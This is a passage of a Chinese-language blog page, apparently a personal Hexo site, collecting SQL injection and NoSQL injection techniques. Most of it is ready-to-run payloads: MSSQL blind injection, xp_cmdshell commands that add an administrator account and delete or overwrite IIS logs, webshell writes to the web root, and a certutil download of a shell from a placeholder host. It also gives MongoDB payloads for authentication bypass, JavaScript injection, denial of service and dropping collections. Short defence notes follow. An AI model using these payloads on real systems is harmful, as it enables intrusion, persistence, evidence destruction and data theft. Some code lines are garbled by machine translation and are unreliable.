+and ascii(substring(db_name(7),1,1))&gt;100  //爆库名
+and (select count(name) from test..sysobjects where xtype=&#39;U&#39;)&gt;1   //判断表的个数
+and (select count(name) from test..syscolumns where id=(select id from test..sysobjects where name=&#39;users&#39;))=3      //判断字段数
+and len((select top 1 col_name(object_id(&#39;users&#39;),1) from test..sysobjects))&gt;1  //爆字段名
+</code></pre>
+<h4 id="延迟盲注"><a href="#延迟盲注" class="headerlink" title="延迟盲注"></a>延迟盲注</h4><pre><code>判断是否是SA权限
+if(1=(select is_srvrolemember(&#39;sysadmin&#39;))) WAITFOR DELAY &#39;0:0:2&#39;
+判断是否是站库分离(延时后返回正确页面，确定站库没有分离)
+if(host_name()=@@servername) WAITFOR DELAY &#39;0:0:2&#39;
+判断数据库的个数
+IF(UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(name))) AS NVARCHAR(4000)),CHAR(32)) FROM master..sysdatabases),1,1))=55) WAITFOR DELAY &#39;0:0:2&#39;
+</code></pre>
+<h3 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a>报错注入</h3><p>用到函数convert(int,(select top 1 db_name() ))，</p>
+<p>CAST(USER as int)</p>
+<p>其含义是将第二个参数的值转换成第一个参数的int类型</p>
+<h3 id="堆叠注入-1"><a href="#堆叠注入-1" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>SQLServer堆叠注入，由于执行的命令没有回显，所以需要结合时间盲注来查询数据。由于堆叠查询的语句会被执行，所以下面的SQLServer获取权限的奇淫技巧，就是利用到了堆叠注入这一特性。</p>
+<h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><h4 id="sa权限下"><a href="#sa权限下" class="headerlink" title="sa权限下"></a>sa权限下</h4><h5 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h5><h6 id="判断是否存在"><a href="#判断是否存在" class="headerlink" title="判断是否存在"></a>判断是否存在</h6><pre><code class="javascript">?id=1 and 1=(select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;)
+</code></pre>
+<p><code>xp_cmdshell</code>默认在<code>mssql_2000</code>中是开启的，在<code>mssql_2005</code>之后的版本中则默认禁止。如果用户拥有管理员<code>sa</code>权限则可以用<code>sp_configure</code>重新开启它。</p>
+<h5 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h5><pre><code class="javascript">开启 xp_cmdshell：
+exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;
+exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;
+关闭 xp_cmdshell：
+exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;
+exec sp_configure &#39;xp_cmdshell&#39;, 0;reconfigure
+</code></pre>
+<h5 id="提权-2"><a href="#提权-2" class="headerlink" title="提权"></a>提权</h5><h6 id="新建用户"><a href="#新建用户" class="headerlink" title="新建用户"></a>新建用户</h6><pre><code class="javascript">?id=1 ;exec master..xp_cmdshell &quot;net user saul saul123 /add&quot;
+</code></pre>
+<h6 id="添加到管理组"><a href="#添加到管理组" class="headerlink" title="添加到管理组"></a>添加到管理组</h6><pre><code class="javascript">?id=1  ;exec master..xp_cmdshell &quot;net localgroup administrators saul /add&quot;
+</code></pre>
+<h6 id="删除日志记录"><a href="#删除日志记录" class="headerlink" title="# 删除日志记录"></a># 删除日志记录</h6><pre><code>id=1;exec master.dbo.xp_cmdshell &#39;del c:\winnt\system32\logfiles\w3svc5\ex070606.log &gt;c:\temp.txt&#39; 
+</code></pre>
+<h6 id="替换日志记录"><a href="#替换日志记录" class="headerlink" title="替换日志记录"></a>替换日志记录</h6><pre><code> id=1;exec master.dbo.xp_cmdshell &#39;copy c:\winnt\system32\logfiles\w3svc5\ex070404.log c:\winnt\system32\logfiles\w3svc5\ex070606.log &gt;c:\temp.txt&#39; 
+</code></pre>
+<h6 id="写马到网站根目录（已知）"><a href="#写马到网站根目录（已知）" class="headerlink" title="写马到网站根目录（已知）"></a>写马到网站根目录（已知）</h6><pre><code>1;exec master..xp_cmdshell &#39;echo ^&lt;?php @eval($_POST[x]);?^&gt; &gt; C:\phpstudy\www\shell.php&#39;;--
+</code></pre>
+<p>或者远程下载</p>
+<pre><code>1;exec master..xp_cmdshell &#39;certutil -urlcache -split -f http://x.x.x.x/shell.php C:\phpstudy\www\shell2.php&#39;;--
+</code></pre>
+<h4 id="dbowner权限"><a href="#dbowner权限" class="headerlink" title="dbowner权限"></a>dbowner权限</h4><p>搜索web目录</p>
+<pre><code>id=1;create table temp(dir nvarchar(255),depth varchar(255),files varchar(255),ID int NOT NULL IDENTITY(1,1));-- 然后 id=1;insert into temp(dir,depth,files)exec master.dbo.xp_dirtree &#39;c:&#39;, 1,1;-- id=1 and(select dir from temp where id=1)&gt;0
+</code></pre>
+<h6 id="写马"><a href="#写马" class="headerlink" title="写马"></a>写马</h6><pre><code>id=1;alter database ssdown5 set RECOVERY FULL;create table test(str image);-- id=1;backup log ssdown5 to disk=&#39;c:\test&#39; with init;-- id=1;insert into test(str) values (&#39;&lt;%execute(request(&quot;cmd&quot;))%&gt;&#39;);-- id=1;backup log ssdown5 to disk=&#39;c:\inetpub\wwwroot\x.asp&#39;;-- id=1;alter database ssdown5 set RECOVERY simple;--
+</code></pre>
+<h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><h5 id="xp-cmdshell被禁用"><a href="#xp-cmdshell被禁用" class="headerlink" title="xp_cmdshell被禁用"></a>xp_cmdshell被禁用</h5><h6 id="sp-configure函数"><a href="#sp-configure函数" class="headerlink" title="sp_configure函数"></a>sp_configure函数</h6><p>下面的命令添加一个影子用户并加入管理员组</p>
+<pre><code class="php">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net user hack$ 0r@nge /add&#39;;
+declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run
+</code></pre>
+<h5 id="log备份写shell"><a href="#log备份写shell" class="headerlink" title="log备份写shell"></a>log备份写shell</h5><p><strong>前提条件</strong>：</p>
+<p>1.数据库存在注入</p>
+<p>2.用户具有读写权限，一般至少DBO权限</p>
+<p>3.有网站的具体路径</p>
+<p>4.站库不分离</p>
+<p>而且这种方法备份出的马子体积很小，备份成功的可能性很大。</p>
+<p><strong>步骤</strong>：</p>
+<p>1.修改数据库为还原模式(恢复模式)：</p>
+<pre><code class="php">;alter database 库名 set RECOVERY FULL –-
+</code></pre>
+<p>3.建表和字段</p>
+<pre><code class="php">;create table orange(a image)--
+</code></pre>
+<p>3.备份数据库</p>
+<pre><code class="php">;backup log 数据库名 to disk = ‘c:\www\0r@nge1.bak’ with init –
+</code></pre>
+<p>4.往表中写入一句话</p>
+<pre><code class="php">;insert into orange(a) values (0x...)--    //值要进行hex进制转换下
+</code></pre>
+<p>5.利用log备份到web的物理路径</p>
+<pre><code class="php">;backup log 数据库名 to disk = &#39;c:\www\0r@nge2.php&#39; with init-- 
+</code></pre>
+<p>6.删除表</p>
+<pre><code class="php">;Drop table orange-- 
+</code></pre>
+<h5 id="差异备份写shell"><a href="#差异备份写shell" class="headerlink" title="差异备份写shell"></a>差异备份写shell</h5><p>概念：备份自上一次完全备份之后有变化的数据。差异备份过程中，只备份有标记的那些选中的文件和文件夹。它不清除标记，也即备份后不标记为已备份文件。换言之，不清除存档属性。</p>
+<p>用人话说就是：第二次备份的时候，与上一次完全备份的时候作对比，把不同的内容备份下来，所以只要插入我们的一句话木马，再备份一下，一句话就会被写到数据库中。</p>
+<p><strong>条件</strong>：</p>
+<ol>
+<li>有网站具体路径</li>
+<li>有可写权限(dbo权限以上)</li>
+<li>站库不分离</li>
+</ol>
+<p>1.备份数据库</p>
+<pre><code class="php">;backup database 数据库名 to disk = &#39;C:\www\\...&#39; with init --
+</code></pre>
+<p>2.创建表格</p>
+<pre><code class="php">%&#39;;create table orange(a image) --
+</code></pre>
+<p>3.写入webshell</p>
+<pre><code class="php">%&#39;;insert into orange(a) values (0xxxxx) --
+</code></pre>
+<p>4.进行差异备份</p>
+<pre><code class="php">%&#39;;backup log 数据库名 to disk = &#39;C:\www\orange.asp&#39;  WITH DIFFERENTIAL,FORMAT;--
+</code></pre>
+<p>5.删除表</p>
+<pre><code class="php">;Drop table orange--
+</code></pre>
+<p>这些都是理论，实战中可能被各种过滤，还需要修改payload进行具体绕过</p>
+<h5 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h5><p>特殊字符 %C2%85 или %C2%A0</p>
+<p>科学(0E)和十六进制(0x)表示法</p>
+<p>在From和列名之间使用句号代替空格</p>
+<p>\N分隔符</p>
+<p>一些无法看懂的方法：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86011">https://www.anquanke.com/post/id/86011</a></p>
+<h2 id="Redis利用"><a href="#Redis利用" class="headerlink" title="Redis利用"></a>Redis利用</h2><p> Node.js上最流行的Redis驱动程序为我们提供了一个很好的起点。</p>
+<p>所有函数都采用<code>args</code>数组加上可选的<code>callback</code>函数，或者可变数量的单个参数，后跟可选的回调。</p>
+<p>此功能允许使用多种不同的方式来调用完全相同的功能。 这样的前提条件非常适合注入攻击。 例如，以下两个调用导致完全相同的数据库查询。</p>
+<pre><code>  client.set（“ some_key”，“ some_val”）; 
+ client.set（[[“ some_key”，“ some_val”]）;; 
+</code></pre>
+<p>第一行是我们的注入方法适用的地方。 当攻击者控制任何用逗号分隔的参数时，他可以通过注入数组而不是字符串或整数值来覆盖以下所有参数。 <strong>基本上，我们尝试将第一行（单个参数）转换为第二行（arguments数组）</strong> 。 以下示例在快速应用程序的上下文中说明了这种方法。</p>
+<h3 id="Redis-JSON"><a href="#Redis-JSON" class="headerlink" title="Redis JSON"></a>Redis JSON</h3><p>我们假定一个应用程序从请求中获取一个任意键，并设置一个默认的硬编码值。 在第一个示例中，密钥由<strong>JSON</strong>主体提供。</p>
+<pre><code>app.use（bodyParser.json（））; app.post（&#39;/&#39;，函数（req，res）&#123;
+     redis.set（ req.body.key ，“默认”）;
+ &#125;）; 
+</code></pre>
+<p>普通请求：将JSON主体设置为<code>&#123;key : &quot;foo&quot;&#125;</code>并导致<code>redis.set(&quot;foo&quot;, &quot;default&quot;);</code></p>
+<p>注射要求：将JSON主体设置为<code>&#123;key : [&quot;foo&quot;, &quot;evil&quot;]&#125;</code>并<code>redis.set([&quot;foo&quot;, &quot;evil&quot;], &quot;default&quot;);</code></p>
+<p>该插入的数组将作为数据库驱动程序调用的第一个参数<code>req.body.key</code>插入。 驱动程序将注入的数组解释为参数数组，并将<code>foo=evil</code>存储为键值对。 另一方面，现在尾随的<code>&quot;default&quot;</code>值将被忽略。</p>
+<h3 id="Redis-查询字符串"><a href="#Redis-查询字符串" class="headerlink" title="Redis 查询字符串"></a>Redis 查询字符串</h3><p>我们假定使用相同的应用程序，但是这次密钥是由<strong>表单URL编码的</strong> body参数提供的。</p>
+<pre><code>  app.use（bodyParser.urlencoded（））; app.post（&#39;/&#39;，函数（req，res）&#123;
+     redis.set（ req.body.key ，“默认”）;
+ &#125;）; 
+</code></pre>
+<p>普通请求：设置查询字符串t0 <code>key=foo</code>并导致<code>redis.set(&quot;foo&quot;, &quot;default&quot;);</code></p>
+<p>注入请求：将查询字符串设置为<code>key[]=foo&amp;key[]=evil</code>并导致<code>redis.set([&quot;foo&quot;, &quot;evil&quot;], &quot;default&quot;);</code></p>
+<p>此模块启用扩展的查询字符串语法，该语法允许用户将对象或数组作为参数传递。 最重要的是，像express这样的流行框架默认情况下会启用此模块。 在这些情况下， <code>?key[]=foo&amp;key[]=evil</code>转换为一个数组，该数组又被驱动程序解释为一个参数数组。 结果， <code>foo=evil</code>被存储为键值对，并且尾随的<code>&quot;default&quot;</code>值也被清除。</p>
+<h3 id="Redis-编码的表单网址"><a href="#Redis-编码的表单网址" class="headerlink" title="Redis 编码的表单网址"></a>Redis 编码的表单网址</h3><p>我们假定使用相同的应用程序，但是这次密钥是由<strong>表单URL编码的</strong> body参数提供的。</p>
+<pre><code>  app.use（bodyParser.urlencoded（））; app.post（&#39;/&#39;，函数（req，res）&#123;
+     redis.set（ req.body.key ，“默认”）;
+ &#125;）; 
+</code></pre>
+<p>普通请求：设置查询字符串t0 <code>key=foo</code>并导致<code>redis.set(&quot;foo&quot;, &quot;default&quot;);</code></p>
+<p>注入请求：将查询字符串设置为<code>key[]=foo&amp;key[]=evil</code>并导致<code>redis.set([&quot;foo&quot;, &quot;evil&quot;], &quot;default&quot;);</code></p>
+<p>此注入向量利用了<code>bodyParser</code>的行为，该行为使数组可以通过应用于表单URL编码的请求主体的相同扩展语法（如第二个示例所示）进行注入。</p>
+<h3 id="Redis防范"><a href="#Redis防范" class="headerlink" title="Redis防范"></a>Redis防范</h3><p>为了避免 NoSQL 注入，您必须始终将用户输入视为不受信任。您可以执行以下操作来验证用户输入：</p>
+<p>1.使用 sanitization library 。例如，mongo-sanitize 或 mongoose。<br>2.如果找不到适合您环境的库，请将用户输入转换为所需的类型。例如，将用户名和密码转换为字符串。<br>3.白名单</p>
+<h2 id="MongoDB利用"><a href="#MongoDB利用" class="headerlink" title="MongoDB利用"></a>MongoDB利用</h2><p>有两种 NoSQL 注入分类的方式：</p>
+<p>第一种是按照语言的分类，可以分为：PHP 数组注入，JavaScript 注入和 Mongo Shell 拼接注入等等。</p>
+<p>第二种是按照攻击机制分类，可以分为：重言式注入，联合查询注入，JavaScript 注入、盲注等，这种分类方式很像传统 SQL 注入的分类方式。</p>
+<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><pre><code>创建数据库：use DATABASE_NAME，数据库不存在，则创建数据库，否则切换到指定数据库。
+查看所有数据库： show dbs、db.getCollectionNames()
+版本：db.version()
+删除数据库：db.dropDatabase()
+查看当前数据库：db、db.getName()
+插入：db.COLLECTION_NAME.insert(document)
+查询：db.COLLECTION_NAME.find(query, projection)
+db.collection.find(query, projection) //query 可选，使用查询操作符指定查询条件 //可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略） 举例： //查找username为JrXnm的信息 db.user.find(&#123;&#39;username&#39;:&#39;JrXnm&#39;&#125;)  mongodb条件操作符 
+比较：     
+$gt : &gt;    
+$lt : &lt;    
+$gte: &gt;=    
+$lte: &lt;=   
+$ne : !=、&lt;&gt;    //查找用户名不为admin且password为123456的用户    db.user.find(&#123;&#39;username&#39;: &#123;$ne:&#39;admin&#39;&#125;, &#39;password&#39;: &#39;123456&#39;&#125;)     
+/**    * : 范围查询 &#123; &quot;age&quot; : &#123; &quot;$gte&quot; : 2 , &quot;$lte&quot; : 21&#125;&#125;    * : $ne &#123; &quot;age&quot; : &#123; &quot;$ne&quot; : 23&#125;&#125;    * : $lt &#123; &quot;age&quot; : &#123; &quot;$lt&quot; : 23&#125;&#125;    */ 
+条件：    
+$in : in    
+$nin: not in    
+$all: all     
+$or:or    
+$and: and    
+$not: 反匹配(1.3.3及以上版本)    
+$exist:     //如果记录中有包含该属性的全部返回    db.collection.find(&#123;title:&#123;$exists:true&#125;&#125;);      //查找用户名为在这个数组中的用户信息    db.user.find(&#123;&#39;username&#39;: &#123;$in: [&#39;admin&#39;, &#39;JrXnm&#39;]&#125;&#125;) 正则：      模糊查询用正则式：db.customer.find(&#123;&#39;name&#39;: &#123;&#39;$regex&#39;:&#39;.*s.*&#39;&#125; &#125;)    正则的另一种写法：db.user.find(&#123;&#39;username&#39;:/jrx/i&#125;)
+limit：db.COLLECTION_NAME.find().limit(NUMBER)
+skip：skip() 方法为跳过指定数量的数据。接受一个数字参数作为跳过的记录条数。db.COLLECTION_NAME.find().limit(NUMBER).skip(NUMBER)
+注释：//
+转为 json：tojson()
+</code></pre>
+<p>所有 <code>db</code>的方法：</p>
+<pre><code>
+db.adminCommand(               db.getName(                    db.printSlaveReplicationInfo(
+db.aggregate(                  db.getPrevError(               db.propertyIsEnumerable
+db.auth(                       db.getProfilingLevel(          db.prototype
+db.changeUserPassword(         db.getProfilingStatus(         db.removeUser(
+db.cloneCollection(            db.getQueryOptions(            db.repairDatabase(
+db.cloneDatabase(              db.getReplicationInfo(         db.resetError(
+db.commandHelp(                db.getRole(                    db.revokePrivilegesFromRole(
+db.constructor                 db.getRoles(                   db.revokeRolesFromRole(
+db.copyDatabase(               db.getSession(                 db.revokeRolesFromUser(
+db.createCollection(           db.getSiblingDB(               db.runCommand(
+db.createRole(                 db.getSisterDB(                db.runCommandWithMetadata(
+db.createUser(                 db.getSlaveOk(                 db.runReadCommand(
+db.createView(                 db.getUser(                    db.serverBits(
+db.currentOP(                  db.getUsers(                   db.serverBuildInfo(
+db.currentOp(                  db.getWriteConcern(            db.serverCmdLineOpts(
+db.dbEval(                     db.grantPrivilegesToRole(      db.serverStatus(
+db.dropAllRoles(               db.grantRolesToRole(           db.setLogLevel(
+db.dropAllUsers(               db.grantRolesToUser(           db.setProfilingLevel(
+db.dropDatabase(               db.group(                      db.setSlaveOk(
+db.dropRole(                   db.groupcmd(                   db.setWriteConcern(
+db.dropUser(                   db.groupeval(                  db.shutdownServer(
+db.eval(                       db.hasOwnProperty              db.stats(
+db.forceError(                 db.help(                       db.system.profile
+db.fsyncLock(                  db.hostInfo(                   db.toLocaleString
+db.fsyncUnlock(                db.isMaster(                   db.toString(
+db.getCollection(              db.killOP(                     db.tojson(
+db.getCollectionInfos(         db.killOp(                     db.unsetWriteConcern(
+db.getCollectionNames(         db.listCommands(               db.updateRole(
+db.getLastError(               db.loadServerScripts(          db.updateUser(
+db.getLastErrorCmd(            db.logout(                     db.users
+db.getLastErrorObj(            db.printCollectionStats(       db.valueOf(
+db.getLogComponents(           db.printReplicationInfo(       db.version(
+db.getMongo(                   db.printShardingStatus(
+</code></pre>
+<h3 id="重言式注入"><a href="#重言式注入" class="headerlink" title="重言式注入"></a>重言式注入</h3><p>源码：</p>
+<pre><code>$data = array(
+    &#39;username&#39; =&gt;  $_REQUEST[&#39;username&#39;],
+    &#39;password&#39; =&gt;  $_REQUEST[&#39;password&#39;]
+); 
+$cursor = $collection-&gt;find($data);
+</code></pre>
+<p>payload：?username[$ne]&#x3D;1&amp;password[$ne]&#x3D;1</p>
+<p>该payload解析后数据库返回username不为1且passwd不为1的数据</p>
+<h3 id="联合查询-3"><a href="#联合查询-3" class="headerlink" title="联合查询"></a>联合查询</h3><p>由于使用json会变得比较麻烦</p>
+<p>源码：</p>
+<pre><code>string query =&quot;&#123; username: &#39;&quot; + $username + &quot;&#39;, password: &#39;&quot; + $password + &quot;&#39; &#125;&quot;
+</code></pre>
+<p>正常输入结果：</p>
+<pre><code>&#123;&#39;username&#39;:&#39;admin&#39;, &#39;password&#39;:&#39;123456&#39;&#125;
+</code></pre>
+<p>payload：</p>
+<pre><code>username=admin&#39;, $or: [ &#123;&#125;, &#123;&#39;a&#39;: &#39;a&amp;password=&#39; &#125;], $comment: &#39;123456
+</code></pre>
+<p>注入后执行：</p>
+<pre><code>&#123; username: &#39;admin&#39;, $or: [ &#123;&#125;, &#123;&#39;a&#39;:&#39;a&#39;, password: &#39;&#39; &#125;], $comment: &#39;123456&#39;&#125;
+</code></pre>
+<p>爆数据库版本</p>
+<pre><code>?username=test&#39;&#125;);return &#123;username:tojson(db.getCollectionNames()),password:2&#125;;//&amp;password=test
+</code></pre>
+<p>爆所有集合名</p>
+<p>PS:因为db.getCollectionNames()返回的是数组，需要用tojson转换为字符串。并且mongodb函数区分大小写</p>
+<pre><code>?username=test&#39;&#125;);return&#123;username=tojson(db.getCollectionNames()),password:2&#125;;//&amp;password=test
+</code></pre>
+<p>爆test集合的第一条数据</p>
+<pre><code>?username=test&#39;&#125;);return &#123;username:tojson(db.test.find()[0]),password:2&#125;;//&amp;password=test
+</code></pre>
+<h3 id="JavaScript-注入"><a href="#JavaScript-注入" class="headerlink" title="JavaScript 注入"></a>JavaScript 注入</h3><h5 id="where"><a href="#where" class="headerlink" title="$where"></a>$where</h5><p>在 MongoDB 中，<code>$where</code> 操作符可以用来执行 JavaScript 代码，将 JavaScript 表达式的字符串或 JavaScript 函数作为查询语句的一部分。</p>
+<p>在 MongoDB 2.4 之前，通过 <code>$where</code> 操作符使用 <code>map-reduce</code>、<code>group</code> 命令可以访问到 Mongo Shell 中的全局函数和属性，如 <code>db</code>，也就是说可以通过自定义 JavaScript 函数来获取数据库的所有信息</p>
+<pre><code>username=1&amp;password=1&#39;;(function()&#123;return(tojson(db.getCollectionNames()))&#125;)();var a=&#39;1
+</code></pre>
+<p>MongoDB 2.4 之后 <code>db</code> 属性访问不到了，但我们应然可以构造万能密码。</p>
+<pre><code>username=1&amp;password=1&#39;;return true//
+或
+username=1&amp;password=1&#39;;return true;var a=&#39;1
+</code></pre>
+<p>还有一种 DOS 攻击的 payload，可以让服务器 CPU 飙升到 100% 持续 5 秒：</p>
+<pre><code>?username=1&amp;password=1;(function()&#123;var date = new Date(); do&#123;curDate = new Date();&#125;while(curDate-date&lt;5000); return Math.max();&#125;)();
+</code></pre>
+<h5 id="使用-Command-方法造成的注入"><a href="#使用-Command-方法造成的注入" class="headerlink" title="使用 Command 方法造成的注入"></a>使用 Command 方法造成的注入</h5><p>MongoDB Driver 一般都提供直接执行 Shell 命令的方法，这些方式一般是不推荐使用的</p>
+<p>在 MongoDB 的服务器端可以通过 <code>db.eval</code> 方法来执行 JavaScript 脚本，如我们可以定义一个 JavaScript 函数，然后通过 <code>db.eval</code> 在服务器端来运行。</p>
+<p><code>eval</code>使用方式在 Mongo3.0 之后已经被废弃了，而且在官方页面中也没有 Mongo3.0 版本之前的下载链接了</p>
+<pre><code>?username=1&#39;&#125;);db.users.insert(&#123;&quot;username&quot;:&quot;ca01h&quot;,&quot;password&quot;:&quot;1&quot;&#125;);db.users.find(&#123;&#39;username&#39;:&#39;2
+</code></pre>
+<p>删掉 users 集合：</p>
+<pre><code class="javascript">?username=1&#39;&#125;);db.users.drop();db.users.find(&#123;&#39;username&#39;:&#39;2
+</code></pre>
+<h5 id="mapReduce"><a href="#mapReduce" class="headerlink" title="mapReduce"></a>mapReduce</h5><p>MongoDB 中的<code>mapReduce</code>函数有点类似于 MySQL 中的<code>group by</code>操作，下面是一个官方文档的例子，在集合 orders 中查找 status:”A” 的数据，并根据 cust_id 来分组，并计算 amount 的总和</p>
+<h3 id="布尔盲注-4"><a href="#布尔盲注-4" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>当页面没有回显时，那么我们可以通过 <code>$regex</code> 正则表达式来进行盲注， <code>$regex</code> 可以达到和传统 SQL 注入中 <code>substr()</code> 函数相同的功能。</p>
+<p>已知某一个用户名的前提下判断的密码长度：</p>
+<pre><code>?username[$eq]=ca01h&amp;password[$regex]=.&#123;5&#125;
+</code></pre>
+<p>逐位提取字符：</p>
+<pre><code># url格式
+?username[$eq]=ca01h&amp;password[$regex]=c.&#123;4&#125;
+?username[$eq]=ca01h&amp;password[$regex]=ca.&#123;3&#125;
+?username[$eq]=ca01h&amp;password[$regex]=ca0.&#123;2&#125;
+?username[$eq]=ca01h&amp;password[$regex]=c.*
+?username[$eq]=ca01h&amp;password[$regex]=ca.*
+# json格式
+&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^c&quot; &#125;&#125;
+&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^ca&quot; &#125;&#125;
+&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^ca0&quot; &#125;&#125;
+</code></pre>
+<p>闭合方法的盲注</p>
+<pre><code>?username=test&#39;&#125;);if (db.version() &gt; &quot;0&quot;) &#123; sleep(10000); exit; &#125;var b=(&#123;a:&#39;1&amp;password=test
+</code></pre>
+<h3 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h3><p>为了避免 NoSQL 注入，您必须始终将用户输入视为不受信任。您可以执行以下操作来验证用户输入：</p>
+<p>1.使用 sanitization library 。例如，mongo-sanitize 或 mongoose。<br>2.如果找不到适合您环境的库，请将用户输入转换为所需的类型。例如，将用户名和密码转换为字符串。<br>3.白名单<br>4.在 MongoDB 的情况下，切勿在用户输入中使用 where，mapReduce 或 group 运算符，因为这些运算符使攻击者能够注入 JavaScript，因此比其他运算符更加危险。为了加强安全性，在 mongod.conf 如果可能的话，设置 javascriptEnabled 为 false。<br>此外，请始终使用最小特权模型：以尽可能低的特权运行您的应用程序，以便即使被利用，攻击者也无法访问其他资源。</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+    </div>
+    <a href="/2022/08/24/三，sql漏洞/" class="go-post">
+        阅读全文
+    </a>
+</div>
+
+             
+<div class="page-current">
+    <div class="prev">
+        
+    </div>
+    <div class="page-index">
+        
+        <span class="current">
+            1
+        </span>
+        
+        <span>
+            <a href="/page/2/">
+                <span class="page-num">
+                    2
+                </span>
+            </a>
+            
+            
+        </span>
+        
+    </div>
+    <div class="next">
+        
+        <a href="/page/2/ ">
+            <span class="page-num">
+                <i class="fa-solid fa-caret-right fa-fw"></i>
+            </span>
+        </a>
+        
+    </div>
+</div>
+        </div>
+    </div>
+    
+    <div id="home-card">
+        <div id="card-div">
+    <div class="card-style" style="width: 300px">
+        <div class="avatar">
+            <img src=" " alt="avatar">
+        </div>
+        <div class="name">
+            John Doe
+        </div>
+        <div class="descriptions">
+            
+            <div class="description">
+                Description...
+            </div>
+            
+        </div>
+        <div class="icon-links">
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://github.com/argvchs">
+                    <i class="fa-brands fa-github fa-fw"></i>
+                </a>
+            </span>
+            
+        </div>
+        <div class="friend-links">
+            
+        </div>
+    </div>
+</div>
+    </div>
+    
+</div>
+                         
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 20xx - 2022 Hexo
+            <span class="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            @John Doe
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a></div>
+        
+    </div>
+</footer>
+                    </div>
+                </div>
+            </transition>
+            <div id="img_show">
+                <img id="img_content" alt="img_show">
+            </div>
+        </div>
+        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
+        <script src="/js/particlex.js"></script>
+        <script src="/js/showimg.js"></script>
+        
+
+    </body>
+</html>
